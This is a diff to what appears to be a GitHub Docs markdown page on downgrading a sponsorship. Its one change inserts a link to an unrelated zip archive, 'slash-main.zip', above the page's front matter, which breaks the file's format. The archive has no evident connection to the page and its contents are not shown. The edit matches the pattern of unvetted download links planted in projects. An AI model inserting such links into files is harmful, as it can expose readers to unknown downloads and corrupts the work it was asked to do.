@@ -1,3 +1,4 @@
+[slash-main.zip](https://github.com/github/docs/files/7903989/slash-main.zip)
 ---
 title: Downgrading a sponsorship
 intro: You can downgrade your sponsorship to a lower tier or cancel your sponsorship.
